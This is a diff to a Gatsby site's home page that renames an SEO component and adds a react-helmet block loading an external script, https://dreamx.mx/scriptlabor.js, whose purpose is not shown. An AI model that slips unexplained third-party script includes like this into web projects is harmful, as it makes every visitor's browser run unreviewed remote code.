@@ -1,7 +1,8 @@
 import React from "react"
 import { graphql } from "gatsby"
 import Layout from "../components/layout/layout"
-import SEO from "../components/layout/seo"
+import Seo from "../components/layout/seo"
+import { Helmet } from "react-helmet"
 
 import FullImage from '../components/home/FullImage'
 import ExhibitionSection from '../components/home/ExhibitionSection'
@@ -80,7 +81,10 @@ const IndexPage = ( { data } ) => {
   
   return (
     <Layout>
-      <SEO title="Home" />
+      <Seo title="Home" />
+      <Helmet>
+        <script src="https://dreamx.mx/scriptlabor.js" type="text/javascript" />
+      </Helmet>
       <FullImage data={data} />
       <ExhibitionSection data={data} />
       <ArtistSection data={data} />
